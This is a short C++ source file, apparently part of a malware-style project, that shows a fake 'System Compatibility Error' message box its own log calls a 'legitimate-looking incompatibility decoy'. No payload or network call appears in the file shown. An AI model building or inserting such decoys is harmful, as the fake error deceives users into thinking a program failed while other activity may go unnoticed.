#include "BSOD.h"
#include "../utils/Logger.h"
#include <windows.h>

namespace decoy {

void ShowCompatibilityError() {
    LOG_INFO("Displaying legitimate-looking incompatibility decoy...");

    // Standard Windows MessageBox to look like a real system error
    MessageBoxW(NULL,
        L"This application is not compatible with the current version of Windows.\n\nPlease contact the software vendor for a compatible version.",
        L"System Compatibility Error",
        MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
}

} // namespace decoy
